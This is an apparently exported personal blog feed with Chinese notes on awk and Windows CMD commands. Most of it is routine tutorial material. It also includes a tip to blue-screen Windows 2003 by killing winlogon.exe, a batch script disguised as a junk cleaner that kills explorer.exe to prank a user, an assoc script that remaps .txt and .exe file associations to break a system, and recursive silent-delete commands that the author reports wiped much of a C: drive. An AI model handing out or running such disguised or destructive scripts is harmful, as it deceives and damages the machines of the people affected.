class="line">15</span><br><span class="line">21</span><br><span class="line">28</span><br><span class="line">36</span><br><span class="line">45</span><br><span class="line">55</span><br><span class="line">66</span><br><span class="line">78</span><br><span class="line">91</span><br><span class="line">105</span><br><span class="line">120</span><br><span class="line">...</span><br><span class="line">5050</span><br></pre></td></tr></table></figure><h3 id="awk数组"><a href="#awk数组" class="headerlink" title="awk数组"></a>awk数组</h3><p>统计日志：类似于</p><ul><li>统计每个ip出现次数,统计每种状态码出现次数,统计系统中每个用户被攻击的次数,统计攻击者ip出现次数</li><li>累加求和：统计每个ip消耗的流量</li></ul><table><thead><tr><th></th><th>shell数组</th><th>awk数组</th><th></th></tr></thead><tbody><tr><td>形式</td><td>array[0]=root array[1]=jason</td><td>array[0]=”root” array[1]=”jason”</td><td></td></tr><tr><td>使用</td><td>echo ${array[0]} ${array[1]}</td><td>print array[0] array[1]</td><td></td></tr><tr><td>批量输出数组内容</td><td>for i in ${array[*]}<br/>do<br/>    echo $i<br/>done</td><td>for(i in array)<br/>   print i</td><td><strong>awk数组专用循环</strong>，变量获取到的是数组的下标，想要数组的内容则a[i]</td></tr></tbody></table><p>awk中字母会被识别为变量，所以如果只是想使用字符串需要用双引号引起来,如果是数字就不用</p><ul><li>普通输出</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;a[0]=102;a[1]=104;print a[0],a[1]&#125;&#x27;</span><br><span class="line">102 104</span><br><span class="line">awk &#x27;BEGIN&#123;a[0]=&quot;root&quot;;a[1]=&quot;jason&quot;;print a[0],a[1]&#125;&#x27;</span><br><span class="line">root jason</span><br></pre></td></tr></table></figure><ul><li>批量输出</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;a[0]=&quot;root&quot;;a[1]=&quot;jason&quot;;for(i in a)print a[i]&#125;&#x27;</span><br><span class="line">root</span><br><span class="line">jason</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>实际案例</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 处理一下文件内容，将域名取出并根据域名进行计数排序处理：(百度和sohu面试题)</span></span><br><span class="line">http://www.etiantian.org/index.html</span><br><span class="line">http://www.etiantian.org/1.html</span><br><span class="line">http://post.etiantian.org/index.html</span><br><span class="line">http://mp3.etiantian.org/index.html</span><br><span class="line">http://www.etiantian.org/3.html</span><br><span class="line">http://post.etiantian.org/2.htm1</span><br><span class="line"></span><br><span class="line">www.etiantian.org 出现的次数</span><br><span class="line">post.etiantian.org 出现次数</span><br><span class="line">mp3.etiantian.org 出现次数</span><br><span class="line"></span><br><span class="line">把以上url取出存放到awkurl.txt之后</span><br><span class="line">awk -F&quot;[/.]+&quot; &#x27;&#123;print $2&#125;&#x27; awkurl.txt    # 这里的话//算是一个分隔符，.算分隔符，/也算一个分隔符</span><br><span class="line">www</span><br><span class="line">www</span><br><span class="line">post</span><br><span class="line">mp3</span><br><span class="line">www</span><br><span class="line">post</span><br><span class="line">得到列之后需要使用数组计数</span><br><span class="line">awk -F&quot;[/.]+&quot; &#x27;&#123;array[$2]++&#125;END&#123;for(i in array)print i,array[i]&#125;&#x27; awkurl.txt     # i就是中括号里的内容，即域名，array[i]就是次数</span><br><span class="line">www 3</span><br><span class="line">mp3 1</span><br><span class="line">post 2</span><br><span class="line"></span><br><span class="line">如果想要根据数量排序则用管道符|sort -rnk2     #r是逆序 n是数字 k2是列</span><br><span class="line"><span class="meta">#</span><span class="bash">array[]++ 你要统计什么 []里面就是什么(某一列)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">统计ip次数也是array[<span class="variable">$ip</span>的列]++</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="awk-for循环"><a href="#awk-for循环" class="headerlink" title="awk(for循环)"></a>awk(for循环)</h3><table><thead><tr><th>shell编程c语言for循环</th><th>awkfor循环</th><th></th></tr></thead><tbody><tr><td>for((i=1;i&lt;=10;i++))<br/>do<br/>   echo $i<br/>done</td><td>for(i=1;i&lt;=10;i++)<br/>print i</td><td>awk for循环用来循环每个字段</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;for(i=1;i&lt;=100;i++)sum+=i;print sum&#125;&#x27;</span><br><span class="line">5050</span><br></pre></td></tr></table></figure><h3 id="awk-if判断"><a href="#awk-if判断" class="headerlink" title="awk(if判断)"></a>awk(if判断)</h3><table><thead><tr><th>shell if判断</th><th>awk if</th><th></th></tr></thead><tbody><tr><td>if [“oldhuang” -eq 18];then<br/>echo take to dbj<br/>fi</td><td>if(条件)<br/>print “dbj”</td><td>常用</td></tr><tr><td>if [“oldhuang” -eq 18];then<br/>    echo take to dbj<br/>else<br/>    echo  “rest”<br/>fi</td><td>if()<br/>   print “dbj”<br/>else<br/>   print “rest”</td><td></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;df -h</span></span><br><span class="line">文件系统        容量  已用  可用 已用% 挂载点</span><br><span class="line">udev            952M     0  952M    0% /dev</span><br><span class="line">tmpfs           198M  1.2M  197M    1% /run</span><br><span class="line">/dev/sda1        78G   14G   60G   19% /</span><br><span class="line">tmpfs           988M  4.0K  988M    1% /dev/shm</span><br><span class="line">tmpfs           5.0M     0  5.0M    0% /run/lock</span><br><span class="line">tmpfs           198M   68K  198M    1% /run/user/0</span><br><span class="line">tmpfs           198M   60K  198M    1% /run/user/132</span><br><span class="line"><span class="meta">#</span><span class="bash">查看磁盘空间情况</span></span><br><span class="line"><span class="meta">#</span><span class="bash">判断如果磁盘空间大于10%的话就输出磁盘空间不够</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;df -h |awk -F<span class="string">&quot;[ %]+&quot;</span> <span class="string">&#x27;NR&gt;1&#123;if($5&gt;=10)print &quot;disk not enough&quot;,$1,$NF&#125;&#x27;</span></span></span><br><span class="line">disk not enough /dev/sda1 /       #挂载点/磁盘空间不足，磁盘分区是/dev/sda1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果还想要把第一行先输出出来并保存到一个文本中，则</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;df -h |  awk -F<span class="string">&quot;[ %]+&quot;</span> <span class="string">&#x27;NR==1&#123;print $0&#125;NR&gt;1&#123;if($5&gt;10)print $0&#125;&#x27;</span> |column -t &gt;df.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;cat df.txt</span></span><br><span class="line">文件系统   容量  已用  可用  已用%  挂载点</span><br><span class="line">/dev/sda1  78G   15G   59G   21%    /</span><br></pre></td></tr></table></figure><ul><li>面试题：统计这段语句中，单词中字符数小于6的单词，显示出来</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo I am oldboy teacher welcome to oldboy training class.</span><br><span class="line"></span><br><span class="line">echo I am oldboy teacher welcome to oldboy training class. |awk -F&quot;[ .]&quot; &#x27;&#123;for(i=1;i&lt;=NF;i++)if(length($i)&lt;6)print $i&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">来记一下三剑客的内容吧</summary>
    
    
    
    <category term="Linux" scheme="https://jason177.com/categories/Linux/"/>
    
    
    <category term="LinuxTree" scheme="https://jason177.com/tags/LinuxTree/"/>
    
  </entry>
  
  <entry>
    <title>windows</title>
    <link href="https://jason177.com/2022/05/12/windows/"/>
    <id>https://jason177.com/2022/05/12/windows/</id>
    <published>2022-05-12T05:01:26.000Z</published>
    <updated>2022-06-15T08:04:16.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="windows2003蓝屏炸弹"><a href="#windows2003蓝屏炸弹" class="headerlink" title="windows2003蓝屏炸弹"></a>windows2003蓝屏炸弹</h1><p>有个巨大漏洞，就是有个进程名叫winlogon.exe，可以使用<code>ntsd -c q -pn winlogon.exe</code>命令强制杀死，这个进程是windows2003登录的进程，如果被杀死，则直接蓝屏，需要注意</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205310115360.png" alt="image-20220531011527240"></p><h1 id="DOS基础命令"><a href="#DOS基础命令" class="headerlink" title="DOS基础命令"></a>DOS基础命令</h1><ol><li>图像界面入侵</li><li>命令行入侵，命令行也叫shell，行话：拿到对方的shell</li></ol><h2 id="fsutil"><a href="#fsutil" class="headerlink" title="fsutil"></a>fsutil</h2><p>windows命令行中查看所有的磁盘：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsutil fsinfo drives #这里必须要有权限才能看到</span><br></pre></td></tr></table></figure><p>创建文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsutil file createnew c:\test\haha.txt 3000      # 3000个字节，接近于3kb</span><br></pre></td></tr></table></figure><h2 id="md"><a href="#md" class="headerlink" title="md"></a>md</h2><p>创建文件夹，用空格区分开。如果文件夹需要有空格，则用双引号引起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;md <span class="string">&quot;ni hao&quot;</span><span class="comment">#</span></span> </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;md nihao hahaha<span class="comment"># 一次创建两个文件夹</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="rd"><a href="#rd" class="headerlink" title="rd"></a>rd</h2><p>删除文件夹，也可以用空格隔开一次性删除多个文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;rd nihao hahaha      <span class="comment"># 删除这两个文件夹</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;rd <span class="string">&quot;ni hao&quot;</span><span class="comment"># 文件夹不是空的，删不了，那只能加/s，表示递归删除</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;rd <span class="string">&quot;ni hao&quot;</span> /s/q<span class="comment"># 无提示强制删除，跟linux里面的rm -rf的f一样</span></span></span><br></pre></td></tr></table></figure><p>如果想要删除当前文件夹下的所有文件,比如说当前路径为C:testdos，要删除当前目录下的所有文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301337075.png" alt="image-20220530133703958"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\testdos&gt;rd . /s/q# 文件和文件夹都删除</span><br><span class="line">另一个程序正在使用此文件，进程无法访问。</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里虽然有警告说testdos文件夹正在使用所以无法删除，但是这就是我们主要的目的，不是删除testdos文件夹，而是说删除这个文件夹下面的所有文件</span></span><br><span class="line"></span><br><span class="line"> C:\testdos 的目录</span><br><span class="line"></span><br><span class="line">2022/05/30  13:37    &lt;DIR&gt;          .</span><br><span class="line">2022/05/30  13:37    &lt;DIR&gt;          ..</span><br><span class="line">               0 个文件              0 字节</span><br><span class="line">               2 个目录  8,328,355,840 可用字节</span><br><span class="line">               </span><br><span class="line"><span class="meta">#</span><span class="bash"> 所有文件夹和文件都没了</span></span><br></pre></td></tr></table></figure><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>创建文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo hello &gt; haha.txt</span><br><span class="line"></span><br><span class="line"> C:\testdos 的目录</span><br><span class="line"></span><br><span class="line">2022/05/30  13:53    &lt;DIR&gt;          .</span><br><span class="line">2022/05/30  13:53    &lt;DIR&gt;          ..</span><br><span class="line">2022/05/30  13:53                 8 haha.txt</span><br></pre></td></tr></table></figure><p>echo还可以打印文字</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title &quot;echo处理&quot;</span><br><span class="line">echo &quot;jason&quot;</span><br><span class="line">echo.# 会输出空行</span><br><span class="line">echo &quot;nihao&quot;</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205310035754.png" alt="image-20220531003548648"></p><h2 id="taskkill"><a href="#taskkill" class="headerlink" title="taskkill"></a>taskkill</h2><p>杀死任务、进程</p><ul><li>/im：指定杀死哪个进程</li><li>/f：force，强制杀死进程</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title &quot;处理进程&quot;</span><br><span class="line">echo.</span><br><span class="line">echo ============</span><br><span class="line">echo &quot;准备删除进程&quot;</span><br><span class="line">echo ============</span><br><span class="line">echo.</span><br><span class="line">pause</span><br><span class="line">taskkill /im explorer.exe /f &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>给其它ip地址发送数据包，检查连通性</p><ul><li>-n：自己选择发送多少个数据包</li><li>-t：一直ping</li></ul><p>这个可以让用户觉得cmd已经假死了</p><p>下面制作一个假装是清除垃圾的脚本，实则是整人</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title &quot;清理垃圾&quot;</span><br><span class="line">echo.</span><br><span class="line">echo ============</span><br><span class="line">echo &quot;准备删除系统垃圾&quot;</span><br><span class="line">echo ============</span><br><span class="line">echo.</span><br><span class="line">echo 按任意键删除垃圾</span><br><span class="line">pause</span><br><span class="line">echo.</span><br><span class="line">echo 垃圾清理中...</span><br><span class="line">ping -n 8 127.0.0.1 &gt;nul 2&gt;nul</span><br><span class="line">taskkill /im explorer.exe /f &gt;nul 2&gt;nul</span><br><span class="line">echo 哈哈，你被整了</span><br><span class="line">ping -n 8 127.0.0.1 &gt;nul 2&gt;nul</span><br><span class="line">start c:\windows\explorer.exe</span><br><span class="line">echo ====被吓死了吧=====</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>打印一个文件的内容到终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;<span class="built_in">type</span> haha.txt</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><h2 id="del"><a href="#del" class="headerlink" title="del"></a>del</h2><p>删除文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">del haha.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 可以使用通配符删除</span></span></span><br><span class="line">del *.txt  #删除当前目录下的全部txt文本文件</span><br><span class="line">del *.* /q   #quit静默删除，无提示删除文件</span><br><span class="line">del *.* /s/q #递归删除，这条命令删除当前目录下的所有文件，包括子目录</span><br></pre></td></tr></table></figure><h2 id="gt-gt"><a href="#gt-gt" class="headerlink" title="&gt;&gt;"></a>&gt;&gt;</h2><p>echo创建文件的方法跟这个一样，这个符号是追加内容到某个文件里的，就是linux中的重定向。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;jason&quot; &gt;&gt; haha.txt   # 追加内容到haha.txt文件里，如果没有该文件则创建并且追加</span><br><span class="line"></span><br><span class="line">dir &gt;&gt; dir.txt    # 把dir的内容重定向到dir.txt文件中</span><br><span class="line"></span><br><span class="line">rd . /s/q 2&gt;&gt;c:/test/rd.txt   # 把报错内容重定向到文件中,默认的重定向是不报错的内容(就是1，1可以不写，报错是2)</span><br><span class="line"></span><br><span class="line">rd . /s/q 1&gt;c:/test/rd.txt 2&gt;&amp;1   # 报错和正确的内容都重定向到文件中</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301359550.png" alt="image-20220530135930489"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301432004.png" alt="image-20220530143231879"></p><p>这里没注意路径，直接才C盘根目录遍历删除了文件！！！跟在linux中的根目录下<code>rm -rf *</code>一样！！还好我马上停止了，但是也删除了好多文件，只能慢慢回退一些可以回退的文件(因为我没有快照)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301435491.png" alt="image-20220530143501408"></p><h2 id="nul"><a href="#nul" class="headerlink" title="nul"></a>nul</h2><p>把输出在终端的命令丢弃</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del *.* /s/q &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure><h2 id="ren"><a href="#ren" class="headerlink" title="ren"></a>ren</h2><p>修改名字，重命名rename</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ren haha.txt nohaha.txt#haha.txt名字修改成nohaha.txt</span><br><span class="line">ren 123 456  # 123文件夹名称修改为456</span><br></pre></td></tr></table></figure><h2 id="attrib"><a href="#attrib" class="headerlink" title="attrib"></a>attrib</h2><p>attribute,属性的意思，修改属性的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +h haha.txt#增加一个h：hide，隐藏属性</span><br></pre></td></tr></table></figure><p>这时候，如果没有点击”显示隐藏文件”的按钮，则看不到该文件，dir也没用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +h haha.txt   # +s变成系统文件，+h隐藏属性</span><br></pre></td></tr></table></figure><p>提升为系统级隐藏文件，点击”显示隐藏文件”按钮也没用了，除非使用<code>dir /a</code>，就可以看到haha.txt了，也可以关掉”隐藏受保护的系统文件”的√，就可以了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">attrib /?#显示用法</span><br><span class="line"></span><br><span class="line">attrib /s#显示当前目录下的各个文件属性</span><br></pre></td></tr></table></figure><p>用法：attrib[盘符:][路径][文件名][+r][-r][+a][-a][+s][-s][+h][-h][/s][/d][/?]</p><p>参数说明：</p><p>+r 设置只读属性</p><p>-r 取消只读属性</p><p>+a 设置存档属性</p><p>-a 取消存档属性</p><p>+s 设置系统属性</p><p>-s 取消系统属性</p><p>+h 设置隐藏属性</p><p>-h 取消隐藏属性</p><p>/s 显示目录下所有文件的属性</p><p>/d 将attrib和任意命令行选项应用到目录</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206021521348.png" alt="image-20220602152135650"></p><h2 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h2><ul><li>-s：/s也可以，这个意思是要做定时关机</li><li>-t：指定定时关机的时间</li><li>-a：停止关机</li><li>-f：强制关机，不管有什么程序正在运行，都要关机</li><li>-r：定时重启，取代-s的位置</li><li>-l：注销</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shutdown -s -f -t 60  #秒为单位，60秒后关机</span><br><span class="line">shutdown -r -f -t 60  #秒为单位，60秒后重启</span><br><span class="line">shutdown -a       #取消定时</span><br><span class="line">shutdown -l           #注销，跟logoff一样</span><br></pre></td></tr></table></figure><h2 id="title"><a href="#title" class="headerlink" title="title"></a>title</h2><p>为cmd提供一个标题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title 系统垃圾清理   #标题就会变成&quot;系统垃圾清理&quot;</span><br></pre></td></tr></table></figure><h2 id="assoc"><a href="#assoc" class="headerlink" title="assoc"></a>assoc</h2><p>修改文件关联性，比如说windows识别到txt结尾的文件就会使用记事本打开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">assoc .txt=exefile #意思就是以后系统看到txt后缀的文件，就当作是执行文件使用</span><br><span class="line">assoc .wav=exefile</span><br><span class="line">assoc .bmp=exefile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">assoc .exe=txtfile  #exe后缀的文件都当作是txt文本打开(使用记事本打开)，这个需要谨慎操作，因为cmd也是exe执行文件，如果修改了，cmd都用不了了，脚本也就操作不了了</span><br><span class="line"><span class="meta">#</span><span class="bash">修复</span></span><br><span class="line">assoc .txt=txtfile</span><br><span class="line">assoc .wav=exefile</span><br><span class="line">assoc .bmp=bmpfile</span><br></pre></td></tr></table></figure><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>作用：显示、设置或删除cmd.exe环境变量。</p><p>要求：SET命令不允许变量名含有等号。</p><h3 id="1-显示当前环境变量以及值"><a href="#1-显示当前环境变量以及值" class="headerlink" title="1.显示当前环境变量以及值"></a>1.显示当前环境变量以及值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\75717\Desktop&gt;set</span><br><span class="line">ALLUSERSPROFILE=C:\ProgramData</span><br><span class="line">APPDATA=C:\Users\75717\AppData\Roami</span><br><span class="line">CommonProgramFiles=C:\Program Files\</span><br><span class="line">CommonProgramFiles(x86)=C:\Program F</span><br><span class="line">CommonProgramW6432=C:\Program Files\</span><br><span class="line">COMPUTERNAME=WIN-QBF046B1789</span><br><span class="line">ComSpec=C:\Windows\system32\cmd.exe</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="2-显示以str开头的环境变量以及值"><a href="#2-显示以str开头的环境变量以及值" class="headerlink" title="2.显示以str开头的环境变量以及值"></a>2.显示以str开头的环境变量以及值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\75717\Desktop&gt;set pat</span><br><span class="line">Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32</span><br><span class="line">\WindowsPowerShell\v1.0\;C:\phpstudy_pro\Extensions\MySQL5.7.26\bin;</span><br><span class="line">PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC</span><br></pre></td></tr></table></figure><h3 id="3-设置-修改-清空环境变量"><a href="#3-设置-修改-清空环境变量" class="headerlink" title="3.设置/修改/清空环境变量"></a>3.设置/修改/清空环境变量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">set variable=string</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">设置</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set testvariable=jason</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查询</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set testva</span><br><span class="line">testvariable=jason</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line">jason</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改(直接设置就行了)</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set testvariable=177</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line">177</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">清空</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set testvariable=</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line"><span class="meta">%</span><span class="bash">testvariable%</span></span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;set testvariable</span><br><span class="line">环境变量 testvariable 没有定义</span><br></pre></td></tr></table></figure><h3 id="4-p"><a href="#4-p" class="headerlink" title="4./p"></a>4./p</h3><p>/P 命令行开关允许将变量数值设成用户输入的一行输入。读取输入行之前，显示指定的 promptString。promptString 可以是空的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\75717\Desktop&gt;set /p testvariable=</span><br><span class="line">jason# 这个jason是用户自己输入的</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line">jason</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">如果想要显示什么(promptString不为空)，则</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set /p testvariable=please input the value:</span><br><span class="line">please input the value:177</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo 